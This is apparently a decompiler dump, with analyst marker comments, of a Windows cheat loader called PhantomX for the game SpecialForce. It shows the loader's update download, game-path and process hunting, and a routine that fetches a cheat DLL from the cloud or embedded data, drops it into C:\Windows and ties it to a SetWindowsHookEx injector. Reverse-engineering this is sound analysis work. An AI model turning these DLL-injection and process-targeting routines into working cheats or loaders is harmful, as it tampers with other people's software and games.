  undefined8 local_120;
  char local_118 [260];
  uint local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0021cabb;
  local_10 = ExceptionList;
  local_14 = DAT_00242400 ^ (uint)(local_118 + 0x114);
  ExceptionList = &local_10;
  LOCK();
  DAT_0036078d = 1;
  UNLOCK();
  FUN_001b30c0("Starting download...",0x14);
  FUN_0197df83();
  local_140 = 0;
  pcVar6 = local_118;
  uStack_13c = 0;
  local_150 = (undefined4 ****)0x0;
  uStack_14c = 0;
  uStack_148 = 0;
  uStack_144 = 0;
  do {
    cVar2 = *pcVar6;
    pcVar6 = pcVar6 + 1;
  } while (cVar2 != '\0');
  FUN_001b1ed0(local_118,(int)pcVar6 - (int)(local_118 + 1));
  local_8 = 0;
  if (uStack_13c - local_140 < 0x18) {
    ppppuVar5 = (undefined4 ****)FUN_001b2c10(0x18,local_134,"phantomx_update_temp.exe",0x18);
  }
  else {
    ppppuVar5 = &local_150;
    if (0xf < uStack_13c) {
      ppppuVar5 = local_150;
    }
    iVar8 = (int)ppppuVar5 + local_140;
    local_140 = local_140 + 0x18;
    FUN_0021b2e6(iVar8);
    *(undefined1 *)(iVar8 + 0x18) = 0;
    ppppuVar5 = &local_150;
  }
  local_130 = (undefined4 ****)0x0;
  pppuStack_12c = (undefined4 ***)0x0;
  pppuStack_128 = (undefined4 ***)0x0;
  pppuStack_124 = (undefined4 ***)0x0;
  local_120 = 0;
  local_130 = (undefined4 ****)*ppppuVar5;
  pppuStack_12c = ppppuVar5[1];
  pppuStack_128 = ppppuVar5[2];
  pppuStack_124 = ppppuVar5[3];
  local_120 = *(undefined8 *)(ppppuVar5 + 4);
  ppppuVar5[4] = (undefined4 ***)0x0;
  ppppuVar5[5] = (undefined4 ***)0xf;
  *(undefined1 *)ppppuVar5 = 0;
  local_8 = CONCAT31(local_8._1_3_,2);
  if (0xf < uStack_13c) {
    uVar7 = uStack_13c + 1;
    ppppuVar5 = local_150;
    if (0xfff < uVar7) {
      ppppuVar5 = (undefined4 ****)local_150[-1];
      uVar7 = uStack_13c + 0x24;
      if (0x1f < (uint)((int)local_150 + (-4 - (int)ppppuVar5))) goto LAB_001b8e71;
    }
    FUN_00217940(ppppuVar5,uVar7);
  }
  local_140 = 0;
  ppppuVar5 = &local_130;
  if (0xf < local_120._4_4_) {
    ppppuVar5 = local_130;
  }
  uStack_13c = 0xf;
  local_150 = (undefined4 ****)((uint)local_150 & 0xffffff00);
  FUN_01a2c37a(ppppuVar5);
  cVar2 = FUN_001b8510();
  if (cVar2 == '\0') {
    FUN_001b30c0("Download failed! Please check connection.",0x29);
    local_138 = 2000;
    local_134 = 0;
    FUN_001c7b60();
    LOCK();
    DAT_0036078d = 0;
    UNLOCK();
    LOCK();
    UNLOCK();
    uVar4 = 0;
    uVar3 = DAT_0036078c;
  }
  else {
    FUN_001b30c0("Download finished! Restarting...",0x20);
    local_138 = 1000;
    local_134 = 0;
    FUN_001c7b60();
    uVar3 = FUN_001b8280();
    uVar4 = DAT_0036078c;
  }
  DAT_0036078c = uVar4;
  if (0xf < local_120._4_4_) {
    uVar7 = local_120._4_4_ + 1;
    ppppuVar5 = local_130;
    if (0xfff < uVar7) {
      ppppuVar5 = (undefined4 ****)local_130[-1];
      uVar7 = local_120._4_4_ + 0x24;
      if (0x1f < (uint)((int)local_130 + (-4 - (int)ppppuVar5))) {
LAB_001b8e71:
        pcVar1 = (code *)swi(0x29);
        (*pcVar1)();
        pcVar1 = (code *)swi(3);
        uVar4 = (*pcVar1)();
        return uVar4;
      }
    }
    uVar3 = FUN_00217940(ppppuVar5,uVar7);
  }
  ExceptionList = local_10;
  return uVar3;
}

/*
 * FUNCTION FUN_001b94a0 @ 0x001b94a0  (VA = 0x160000 + RVA 0x594a0)
 * MARKERS:
 *   - SpecialForce game path hunting
 *   - Game window/title match
 */

// ==== FUN_001b94a0 @ 001b94a0 (interesting=yes) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

char * __fastcall FUN_001b94a0(char *param_1)

{
  char cVar1;
  code *pcVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  uint uVar6;
  undefined4 ******ppppppuVar7;
  char *pcVar8;
  char *pcVar9;
  undefined4 *puVar10;
  undefined1 local_1e8 [144];
  uint local_158;
  char *local_154;
  char *local_150;
  undefined8 local_14c;
  undefined4 local_144;
  undefined4 ******local_140;
  undefined4 uStack_13c;
  undefined4 uStack_138;
  undefined4 uStack_134;
  int local_130;
  uint local_12c;
  char local_128 [260];
  uint local_24;
  undefined1 *puStack_20;
  void *local_1c;
  undefined *puStack_18;
  undefined1 local_14;
  undefined1 auStack_13 [3];
  
  puStack_20 = auStack_13 + 0xf;
  local_14 = 0xff;
  auStack_13 = (undefined1  [3])0xffffff;
  puStack_18 = &DAT_0021cbe8;
  local_1c = ExceptionList;
  local_24 = DAT_00242400 ^ (uint)(auStack_13 + 3);
  ExceptionList = &local_1c;
  local_158 = 0;
  local_154 = param_1;
  local_150 = param_1;
  iVar4 = FUN_004b3f25(auStack_13 + 3,0x100,local_128,local_24);
  if (iVar4 != 0) {
    pcVar9 = local_128;
    local_154 = pcVar9;
    if (local_128[0] != '\0') {
      do {
        local_130 = 0;
        local_12c = 0;
        local_140 = (undefined4 ******)0x0;
        uStack_13c = 0;
        uStack_138 = 0;
        uStack_134 = 0;
        pcVar8 = pcVar9;
        do {
          cVar1 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar1 != '\0');
        FUN_001b1ed0(pcVar9,(int)pcVar8 - (int)(pcVar9 + 1));
        local_14 = 0;
        auStack_13 = (undefined1  [3])0x0;
        local_14c = 0;
        local_144 = 0;
        if (0x7fffffffU - local_130 < 0xd) {
LAB_001b98d9:
                    /* WARNING: Subroutine does not return */
          FUN_001af3e0();
        }
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,"SpecialForce\\",0xd);
        uVar6 = local_158;
        local_14 = 1;
        if (0x7fffffffU - local_130 < 0x21) goto LAB_001b98d9;
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,"Program Files (x86)\\SpecialForce\\"
                     ,0x21);
        local_14 = 2;
        if (0x7fffffffU - local_130 < 0x1b) goto LAB_001b98d9;
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,"Program Files\\SpecialForce\\",0x1b)
        ;
        local_14 = 3;
        if (0x7fffffffU - local_130 < 3) goto LAB_001b98d9;
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,&DAT_0023a194,3);
        local_14 = 4;
        if (0x7fffffffU - local_130 < 0x17) goto LAB_001b98d9;
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,"Program Files (x86)\\SF\\",0x17);
        local_14 = 5;
        if (0x7fffffffU - local_130 < 0x11) goto LAB_001b98d9;
        ppppppuVar7 = &local_140;
        if (0xf < local_12c) {
          ppppppuVar7 = local_140;
        }
        FUN_001b2640(local_150,local_130,ppppppuVar7,local_130,"Program Files\\SF\\",0x11);
        local_158 = uVar6 | 0x7e;
        local_14 = 6;
        FUN_001b4360(local_1e8,&local_158,local_1e8);
        local_14 = 8;
        FUN_00217950(local_1e8,0x18,6,FUN_001b1150);
        puVar3 = local_14c._4_4_;
        pcVar9 = local_154;
        for (puVar10 = (undefined4 *)local_14c; puVar10 != puVar3; puVar10 = puVar10 + 6) {
          puVar5 = puVar10;
          if (0xf < (uint)puVar10[5]) {
            puVar5 = (undefined4 *)*puVar10;
          }
          local_154 = pcVar9;
          uVar6 = FUN_00395a02(puVar5,puVar5);
          pcVar9 = local_150;
          if ((uVar6 != 0xffffffff) && ((uVar6 & 0x10) != 0)) {
            FUN_001b11e0(puVar10);
            FUN_001c7ee0();
            if (0xf < local_12c) {
              uVar6 = local_12c + 1;
              ppppppuVar7 = local_140;
              if (0xfff < uVar6) {
                ppppppuVar7 = (undefined4 ******)local_140[-1];
                uVar6 = local_12c + 0x24;
                if (0x1f < (uint)((int)local_140 + (-4 - (int)ppppppuVar7))) goto LAB_001b98d2;
              }
              FUN_00217940(ppppppuVar7,uVar6);
            }
            ExceptionList = local_1c;
            return pcVar9;
          }
          pcVar9 = local_154;
        }
        do {
          cVar1 = *pcVar9;
          pcVar9 = pcVar9 + 1;
        } while (cVar1 != '\0');
        local_154 = pcVar9;
        FUN_001c7ee0();
        local_14 = 0xff;
        auStack_13 = (undefined1  [3])0xffffff;
        if (0xf < local_12c) {
          uVar6 = local_12c + 1;
          ppppppuVar7 = local_140;
          if (0xfff < uVar6) {
            ppppppuVar7 = (undefined4 ******)local_140[-1];
            uVar6 = local_12c + 0x24;
            if (0x1f < (uint)((int)local_140 + (-4 - (int)ppppppuVar7))) {
LAB_001b98d2:
              pcVar2 = (code *)swi(0x29);
              (*pcVar2)();
              goto LAB_001b98d9;
            }
          }
          FUN_00217940(ppppppuVar7,uVar6);
        }
      } while (*pcVar9 != '\0');
      param_1 = local_150;
    }
  }
  param_1[0] = '\0';
  param_1[1] = '\0';
  param_1[2] = '\0';
  param_1[3] = '\0';
  param_1[4] = '\0';
  param_1[5] = '\0';
  param_1[6] = '\0';
  param_1[7] = '\0';
  param_1[8] = '\0';
  param_1[9] = '\0';
  param_1[10] = '\0';
  param_1[0xb] = '\0';
  param_1[0xc] = '\0';
  param_1[0xd] = '\0';
  param_1[0xe] = '\0';
  param_1[0xf] = '\0';
  param_1[0x10] = '\0';
  param_1[0x11] = '\0';
  param_1[0x12] = '\0';
  param_1[0x13] = '\0';
  param_1[0x14] = '\0';
  param_1[0x15] = '\0';
  param_1[0x16] = '\0';
  param_1[0x17] = '\0';
  FUN_001b1ed0(&DAT_0022ecde,0);
  ExceptionList = local_1c;
  return param_1;
}

/*
 * FUNCTION FUN_001bb300 @ 0x001bb300  (VA = 0x160000 + RVA 0x5b300)
 * MARKERS:
 *   - Game process targeting SpecialForce.exe
 *   - Game window/title match
 */

// ==== FUN_001bb300 @ 001bb300 (interesting=no) ====

void FUN_001bb300(void)

{
  code *pcVar1;
  uint *puVar2;
  int iVar3;
  char extraout_DL;
  code *unaff_ESI;
  code *pcVar4;
  code *unaff_EDI;
  code *pcVar5;
  undefined4 uStack_14c;
  undefined1 auStack_13c [20];
  undefined1 auStack_128 [284];
  uint local_c;
  
  local_c = DAT_00242400 ^ (uint)auStack_13c;
  uStack_14c = 0;
  pcVar1 = (code *)FUN_0066bc8c();
  if (pcVar1 != (code *)0xffffffff) {
    pcVar5 = pcVar1;
    puVar2 = (uint *)FUN_0064938a(pcVar1,auStack_13c + -8);
    *puVar2 = *puVar2 & (uint)puVar2;
    unaff_EDI = (code *)0xf1dc358b;
    if (puVar2 != (uint *)0x0) {
      FUN_0051a230();
      pcVar4 = unaff_ESI;
      do {
        iVar3 = (*pcVar5)(auStack_128,"SpecialForce.exe");
        if (iVar3 == 0) {
LAB_001bb38f:
          FUN_006c0659(1,0,0x128);
          pcVar4[0x57] = (code)((char)pcVar4[0x57] + extraout_DL);
          FUN_019513c1();
          unaff_ESI = DAT_0021f1dc;
          (*DAT_0021f1dc)(pcVar4);
        }
        else {
          iVar3 = (*pcVar5)(auStack_128,"SFPatcher.exe");
          if (iVar3 == 0) goto LAB_001bb38f;
          iVar3 = (*pcVar5)(auStack_128,"xldr_specialforce_ph_loader_win32.exe");
          unaff_ESI = pcVar4;
          if (iVar3 == 0) goto LAB_001bb38f;
        }
        iVar3 = FUN_0061c41f(&uStack_14c,pcVar1,&uStack_14c);
        pcVar4 = unaff_ESI;
        unaff_EDI = pcVar5;
      } while (iVar3 != 0);
    }
    (*unaff_ESI)(pcVar1);
  }
  FUN_001baa50();
  FUN_01a933a1(unaff_EDI,0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}

/*
 * FUNCTION FUN_001bc620 @ 0x001bc620  (VA = 0x160000 + RVA 0x5c620)
 * MARKERS:
 *   - YouTube link open
 */

// ==== FUN_001bc620 @ 001bc620 (interesting=no) ====

/* WARNING: Instruction at (ram,0x001bc82b) overlaps instruction at (ram,0x001bc827)
    */

undefined4 __fastcall
FUN_001bc620(undefined4 param_1,undefined4 param_2,undefined4 param_3,uint param_4,ushort param_5)

{
  undefined4 uVar1;
  uint uVar2;
  char extraout_CL;
  char extraout_DL;
  int unaff_EBX;
  undefined1 *puVar3;
  undefined1 *unaff_EBP;
  int unaff_ESI;
  code *unaff_EDI;
  bool bVar4;
  undefined1 auStackY_148 [128];
  
  puVar3 = (undefined1 *)((int)register0x00000010 + -4);
  if (param_4 < 0x11) {
    if (param_4 == 0x10) {
      FUN_00496ad1(0x10,param_3);
      return 0;
    }
    if (param_4 == 1) {
      FUN_0054cd6c();
      (*(code *)0x0)(0,"STATIC","PHANTOMX TACTICAL BRIEFING INTERFACE",0x50000000,0x14,0x14,0x17c,
                     0x14,param_3,0,0);
      (*(code *)0x0)(0,"BUTTON","[ EXECUTE SECURE STREAM LINK ]",0x50000000,0x14,0x37,0x17c,0x2d,
                     param_3,0xca,0,0);
      (*(code *)0x0)(0,"STATIC",
                     "Initialize secure stream link above to review tactical feed.\nProceed option unlocks upon stream verification."
                     ,0x50000000,0x14,0x73,0x17c,0x28,param_3,0,0,0);
      DAT_003606b0 = (*(code *)0x0)(0,"BUTTON","Awaiting Stream Verification...",0x58000000,0x14,
                                    0xb4,0x17c,0x2a,param_3,0xc9,0,0);
      return 0;
    }
    if (param_4 == 2) {
      FUN_01970e4d(param_2,0);
      return 0;
    }
  }
  else {
    if (param_4 == 0x111) {
      uVar2 = (uint)param_5;
      if (uVar2 == 0xca) {
        FUN_00665a13();
        FUN_01972d4a();
        *(char *)(unaff_EBX + -0x58cf9710) = *(char *)(unaff_EBX + -0x58cf9710) - extraout_CL;
        (*unaff_EDI)();
        (*DAT_0021f1f4)(400);
        FUN_01a4fc53(0,&DAT_00239478,"https://youtu.be/yGs_TYpTxfI",0,0,1);
        *(char *)(unaff_ESI + -1) = *(char *)(unaff_ESI + -1) + extraout_DL;
        (*unaff_EDI)(DAT_003606b0,"PROCEED -> ACCESS MANUAL CONTROL MATRIX");
        FUN_0198cf34();
      }
      else {
        bVar4 = SBORROW4(uVar2,0xc9);
        if ((uVar2 != 0xc9) || (FUN_005ae8db(param_3), !bVar4)) {
          return 0;
        }
      }
      return 0;
    }
    if (param_4 == 0x138) goto LAB_001bc735;
  }
  FUN_0060fa73();
  puVar3 = unaff_EBP;
LAB_001bc735:
  uVar1 = FUN_0199edf2(*(undefined4 *)(puVar3 + 0x10),&DAT_0078ff00);
  return uVar1;
}

/*
 * FUNCTION FUN_001be9c0 @ 0x001be9c0  (VA = 0x160000 + RVA 0x5e9c0)
 * MARKERS:
 *   - Mutex Global\SFRush_SecurityMatrix_2026
 *   - Game window/title match
 */

// ==== FUN_001be9c0 @ 001be9c0 (interesting=yes) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined * FUN_001be9c0(void)

{
  code *pcVar1;
  undefined1 *puVar2;
  uint *puVar3;
  undefined *puVar4;
  undefined4 ***pppuVar5;
  undefined4 uVar6;
  int iVar7;
  uint uVar8;
  uint uStack_c8;
  undefined4 local_b8;
  undefined4 ***local_b4;
  undefined4 uStack_b0;
  undefined4 uStack_ac;
  undefined4 uStack_a8;
  int local_a4;
  uint local_a0;
  int local_60;
  uint local_4c;
  uint local_30;
  uint local_2c;
  undefined1 *puStack_24;
  undefined1 *local_20;
  void *local_1c;
  undefined *puStack_18;
  undefined4 local_14;
  
  puStack_24 = (undefined1 *)((int)register0x00000010 + -4);
  local_14 = 0xffffffff;
  puStack_18 = &DAT_0021d1ab;
  local_1c = ExceptionList;
  uStack_c8 = DAT_00242400 ^ (int)register0x00000010 - 0x10U;
  local_20 = (undefined1 *)&uStack_c8;
  ExceptionList = &local_1c;
  local_2c = uStack_c8;
  puVar2 = (undefined1 *)((int)register0x00000010 + -4);
  puVar3 = &uStack_c8;
  if (*(int *)(*(int *)ThreadLocalStoragePointer + 4) < DAT_00360928) {
    FUN_002178a0(&DAT_00360928);
    puVar2 = puStack_24;
    puVar3 = (uint *)local_20;
    if (DAT_00360928 == -1) {
      FUN_0192718e(0,0,"Global\\SFRush_SecurityMatrix_2026");
      pcVar1 = (code *)swi(3);
      puVar4 = (undefined *)(*pcVar1)();
      return puVar4;
    }
  }
  local_20 = (undefined1 *)puVar3;
  puStack_24 = puVar2;
  if (DAT_00360890 == 0) {
    puVar4 = (undefined *)FUN_001b30c0("[ FAILED ] Cannot create handshake security matrix.",0x33);
    ExceptionList = local_1c;
    return puVar4;
  }
  local_a4 = 0;
  local_a0 = 0;
  local_b4 = (undefined4 ***)0x0;
  uStack_b0 = 0;
  uStack_ac = 0;
  uStack_a8 = 0;
  FUN_001b1ed0("C:\\Windows\\SetWindowsHookEx-Injector-master\\SetWindowsHookEx-Injector-master\\x86\\release\\bin"
               ,0x5c);
  local_14 = 0;
  if (0x7fffffffU - local_a4 < 0x25) {
                    /* WARNING: Subroutine does not return */
    FUN_001af3e0();
  }
  pppuVar5 = &local_b4;
  if (0xf < local_a0) {
    pppuVar5 = local_b4;
  }
  FUN_001b2640(local_b8,local_a4,pppuVar5,local_a4,"\\e1c09d8a7f6e5d4c3b2a1f0e9d8c7b6a.dll",0x25);
  local_14._0_1_ = 2;
  local_30 = local_30 & 0xffffff00;
  FUN_001b1fb0(local_30);
  local_14._0_1_ = 3;
  uVar6 = FUN_001b08d0();
  local_14 = CONCAT31(local_14._1_3_,2);
  if (7 < local_4c) {
    uVar8 = local_4c * 2 + 2;
    iVar7 = local_60;
    if (0xfff < uVar8) {
      iVar7 = *(int *)(local_60 + -4);
      uVar8 = local_4c * 2 + 0x25;
      if (0x1f < (local_60 - iVar7) - 4U) {
        pcVar1 = (code *)swi(0x29);
        (*pcVar1)();
        return &DAT_001beb6a;
      }
    }
    uVar6 = FUN_00217940(iVar7,uVar8);
  }
  FUN_006c7ef4(uVar6,"C:\\Windows\\SetWindowsHookEx-Injector-master",6);
  puVar4 = (undefined *)FUN_001beb6d();
  return puVar4;
}



// ==== Catch_All@001beb61 @ 001beb61 (interesting=no) ====

undefined * Catch_All_001beb61(void)

{
  return &DAT_001beb6a;
}

/*
 * FUNCTION FUN_001beb6d @ 0x001beb6d  (VA = 0x160000 + RVA 0x5eb6d)
 * MARKERS:
 *   - Local rawdata fallback
 */

// ==== FUN_001beb6d @ 001beb6d (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined * FUN_001beb6d(void)

{
  char cVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  int unaff_EBP;
  code *pcVar8;
  code *pcVar9;
  bool bVar10;
  bool bVar11;
  undefined *puVar12;
  undefined4 uVar13;
  
  *(undefined4 *)(unaff_EBP + -4) = 1;
  *(undefined1 *)(unaff_EBP + -0x20) = 0;
  FUN_001b1fb0(*(undefined4 *)(unaff_EBP + -0x20));
  iVar4 = unaff_EBP + -0x50;
  if (7 < *(uint *)(unaff_EBP + -0x3c)) {
    iVar4 = *(int *)(unaff_EBP + -0x50);
  }
  FUN_00219760(iVar4);
  if (7 < *(uint *)(unaff_EBP + -0x3c)) {
    iVar5 = *(int *)(unaff_EBP + -0x50);
    iVar4 = *(uint *)(unaff_EBP + -0x3c) * 2;
    uVar6 = iVar4 + 2;
    iVar2 = iVar5;
    if (0xfff < uVar6) {
      iVar2 = *(int *)(iVar5 + -4);
      uVar6 = iVar4 + 0x25;
      if (0x1f < (iVar5 - iVar2) - 4U) goto LAB_001beb5a;
    }
    FUN_00217940(iVar2,uVar6);
  }
  *(undefined4 *)(unaff_EBP + -0x7c) = 0;
  *(undefined4 *)(unaff_EBP + -0x78) = 0;
  *(undefined4 *)(unaff_EBP + -0x8c) = 0;
  *(undefined4 *)(unaff_EBP + -0x88) = 0;
  *(undefined4 *)(unaff_EBP + -0x84) = 0;
  *(undefined4 *)(unaff_EBP + -0x80) = 0;
  FUN_001b1ed0(&DAT_0022ecde,0);
  *(undefined1 *)(unaff_EBP + -4) = 5;
  if (DAT_0035fcc4 == 2) {
    FUN_001b30c0("[-] Injecting V2 from Cloud...",0x1e);
    puVar3 = &DAT_00360960;
    uVar13 = DAT_00360970;
    if (0xf < DAT_00360974) {
      puVar3 = DAT_00360960;
    }
  }
  else {
    FUN_001b30c0("[-] Injecting V1 from Cloud...",0x1e);
    puVar3 = &DAT_003608c8;
    uVar13 = DAT_003608d8;
    if (0xf < DAT_003608dc) {
      puVar3 = DAT_003608c8;
    }
  }
  FUN_001b30c0(puVar3,uVar13);
  cVar1 = FUN_001bda30();
  if (cVar1 == '\0') {
    FUN_001b30c0("[!] Server unreachable. Using local rawdata fallback...",0x37);
    iVar4 = unaff_EBP + -0x68;
    if (0xf < *(uint *)(unaff_EBP + -0x54)) {
      iVar4 = *(int *)(unaff_EBP + -0x68);
    }
    iVar4 = (*DAT_0021f198)(iVar4,0x40000000,0,0,2,0x80,0);
    pcVar9 = DAT_0021f1c4;
    if (iVar4 != -1) {
      bVar10 = DAT_0035fcc4 == 2;
      *(undefined4 *)(unaff_EBP + -0x20) = 0;
      if (bVar10) {
        uVar13 = 0xd6800;
        puVar12 = &DAT_00289490;
      }
      else {
        uVar13 = 0x3a600;
        puVar12 = &DAT_0024ee90;
      }
      (*pcVar9)(iVar4,puVar12,uVar13,unaff_EBP + -0x20,0);
      pcVar8 = DAT_0021f1dc;
      (*DAT_0021f1dc)(iVar4);
      if (0x400 < *(uint *)(unaff_EBP + -0x20)) goto LAB_001bed1e;
    }
    puVar12 = (undefined *)
              FUN_001b30c0("[ FAILED ] Failed to fetch Cloud and Local DLL package.",0x37);
  }
  else {
    pcVar8 = DAT_0021f1dc;
    pcVar9 = DAT_0021f1c4;
LAB_001bed1e:
    iVar4 = unaff_EBP + -0x68;
    if (0xf < *(uint *)(unaff_EBP + -0x54)) {
      iVar4 = *(int *)(unaff_EBP + -0x68);
    }
    FUN_00483c49(pcVar9,iVar4,6);
    FUN_001b30c0("[-] Cloud/Local Cheat Package ready for deployment.",0x33);
    *(undefined4 *)(unaff_EBP + -0x40) = 0;
    *(undefined4 *)(unaff_EBP + -0x3c) = 0;
    *(undefined4 *)(unaff_EBP + -0x50) = 0;
    *(undefined4 *)(unaff_EBP + -0x4c) = 0;
    *(undefined4 *)(unaff_EBP + -0x48) = 0;
    *(undefined4 *)(unaff_EBP + -0x44) = 0;
    FUN_001b1ed0("C:\\Windows\\",0xb);
    *(undefined1 *)(unaff_EBP + -4) = 6;
    iVar4 = *(int *)(unaff_EBP + -0x40);
    if (0x7fffffffU - iVar4 < 0xd) {
                    /* WARNING: Subroutine does not return */
      FUN_001af3e0();
    }
    iVar5 = unaff_EBP + -0x50;
    if (0xf < *(uint *)(unaff_EBP + -0x3c)) {
      iVar5 = *(int *)(unaff_EBP + -0x50);
    }
    FUN_001b2640(*(undefined4 *)(unaff_EBP + -0xa8),iVar4,iVar5,iVar4,"\\PhantomX.dll",0xd);
    *(undefined1 *)(unaff_EBP + -4) = 7;
    if (DAT_0035fc90 != (undefined *)0xffffffff) {
      (*pcVar8)(DAT_0035fc90);
      DAT_0035fc90 = (undefined *)0xffffffff;
    }
    uVar6 = *(uint *)(unaff_EBP + -0x24);
    bVar10 = uVar6 < 0xf;
    bVar11 = uVar6 == 0xf;
    iVar4 = unaff_EBP + -0x38;
    if (0xf < uVar6) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
    }
    FUN_0196f629(iVar4,0x80);
    iVar4 = unaff_EBP + -0x38;
    if (!bVar10 && !bVar11) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
    }
    FUN_005d864c(iVar4,iVar4);
    iVar4 = unaff_EBP + -0x38;
    if (0xf < *(uint *)(unaff_EBP + -0x24)) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
    }
    iVar4 = (*DAT_0021f198)(iVar4,0x40000000,0,0,2,0x80,0);
    *(int *)(unaff_EBP + -0x20) = iVar4;
    if (iVar4 != -1) {
      uVar13 = FUN_00217dd0(4);
      (*pcVar9)(*(undefined4 *)(unaff_EBP + -0x20),&DAT_00242490,0xca00,uVar13,0);
      (*(code *)0xfdc7d83)(*(undefined4 *)(unaff_EBP + -0x20));
    }
    iVar4 = unaff_EBP + -0x38;
    if (0xf < *(uint *)(unaff_EBP + -0x24)) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
    }
    iVar4 = (*DAT_0021f198)(iVar4,2,1,0,3,0x80,0);
    *(int *)(unaff_EBP + -0xa8) = iVar4;
    if (iVar4 != -1) {
      FUN_0061b780(pcVar9,iVar4,0,0,2);
      *(undefined4 *)(unaff_EBP + -0x74) = 0;
      *(undefined4 *)(unaff_EBP + -0x70) = 0;
      *(undefined4 *)(unaff_EBP + -0x6c) = 0;
      FUN_001b76e0(0x4b000);
      iVar4 = *(int *)(unaff_EBP + -0x74);
      FUN_0021b2ce(iVar4,0,0x4b000);
      *(undefined4 *)(unaff_EBP + -0x20) = 0;
      uVar13 = *(undefined4 *)(unaff_EBP + -0xa8);
      *(int *)(unaff_EBP + -0x70) = iVar4 + 0x4b000;
      (*pcVar9)(uVar13,*(undefined4 *)(unaff_EBP + -0x74),0x4b000,unaff_EBP + -0x20,0);
      (*DAT_0021f1dc)(uVar13);
      iVar4 = *(int *)(unaff_EBP + -0x74);
      if (iVar4 != 0) {
        uVar6 = *(int *)(unaff_EBP + -0x6c) - iVar4;
        iVar5 = iVar4;
        if (0xfff < uVar6) {
          iVar5 = *(int *)(iVar4 + -4);
          uVar6 = uVar6 + 0x23;
          if (0x1f < (iVar4 - iVar5) - 4U) goto LAB_001beb5a;
        }
        FUN_00217940(iVar5,uVar6);
      }
    }
    iVar4 = unaff_EBP + -0x38;
    if (0xf < *(uint *)(unaff_EBP + -0x24)) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
    }
    puVar12 = (undefined *)(*DAT_0021f198)(iVar4,0xc0000000,0,0,3,0x80,0);
    uVar6 = *(uint *)(unaff_EBP + -0x24);
    DAT_0035fc90 = puVar12;
    if (0xf < uVar6) {
      iVar4 = *(int *)(unaff_EBP + -0x38);
      uVar7 = uVar6 + 1;
      iVar5 = iVar4;
      if (0xfff < uVar7) {
        iVar5 = *(int *)(iVar4 + -4);
        uVar7 = uVar6 + 0x24;
        if (0x1f < (iVar4 - iVar5) - 4U) goto LAB_001beb5a;
      }
      puVar12 = (undefined *)FUN_00217940(iVar5,uVar7);
    }
    uVar6 = *(uint *)(unaff_EBP + -0x3c);
    *(undefined4 *)(unaff_EBP + -0x28) = 0;
    *(undefined4 *)(unaff_EBP + -0x24) = 0xf;
    *(undefined1 *)(unaff_EBP + -0x38) = 0;
    if (0xf < uVar6) {
      iVar4 = *(int *)(unaff_EBP + -0x50);
      uVar7 = uVar6 + 1;
      iVar5 = iVar4;
      if (0xfff < uVar7) {
        iVar5 = *(int *)(iVar4 + -4);
        uVar7 = uVar6 + 0x24;
        if (0x1f < (iVar4 - iVar5) - 4U) goto LAB_001beb5a;
      }
      puVar12 = (undefined *)FUN_00217940(iVar5,uVar7);
    }
  }
  uVar6 = *(uint *)(unaff_EBP + -0x78);
  if (0xf < uVar6) {
    iVar4 = *(int *)(unaff_EBP + -0x8c);
    uVar7 = uVar6 + 1;
    iVar5 = iVar4;
    if (0xfff < uVar7) {
      iVar5 = *(int *)(iVar4 + -4);
      uVar7 = uVar6 + 0x24;
      if (0x1f < (iVar4 - iVar5) - 4U) goto LAB_001beb5a;
    }
    puVar12 = (undefined *)FUN_00217940(iVar5,uVar7);
  }
  uVar6 = *(uint *)(unaff_EBP + -0x54);
  *(undefined1 *)(unaff_EBP + -0x8c) = 0;
  *(undefined4 *)(unaff_EBP + -0x78) = 0xf;
  *(undefined4 *)(unaff_EBP + -0x7c) = 0;
  if (0xf < uVar6) {
    iVar4 = *(int *)(unaff_EBP + -0x68);
    uVar7 = uVar6 + 1;
    iVar5 = iVar4;
    if (0xfff < uVar7) {
      iVar5 = *(int *)(iVar4 + -4);
      uVar7 = uVar6 + 0x24;
      if (0x1f < (iVar4 - iVar5) - 4U) goto LAB_001beb5a;
    }
    puVar12 = (undefined *)FUN_00217940(iVar5,uVar7);
  }
  uVar6 = *(uint *)(unaff_EBP + -0x90);
  *(undefined4 *)(unaff_EBP + -0x58) = 0;
  *(undefined4 *)(unaff_EBP + -0x54) = 0xf;
  *(undefined1 *)(unaff_EBP + -0x68) = 0;
  if (0xf < uVar6) {
    iVar4 = *(int *)(unaff_EBP + -0xa4);
    uVar7 = uVar6 + 1;
    iVar5 = iVar4;
    if (0xfff < uVar7) {
      iVar5 = *(int *)(iVar4 + -4);
      uVar7 = uVar6 + 0x24;
      if (0x1f < (iVar4 - iVar5) - 4U) {
LAB_001beb5a:
        pcVar9 = (code *)swi(0x29);
        (*pcVar9)();
        return &DAT_001beb6a;
      }
    }
    puVar12 = (undefined *)FUN_00217940(iVar5,uVar7);
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return puVar12;
}

/*
 * FUNCTION FUN_001c0fd0 @ 0x001c0fd0  (VA = 0x160000 + RVA 0x60fd0)
 * MARKERS:
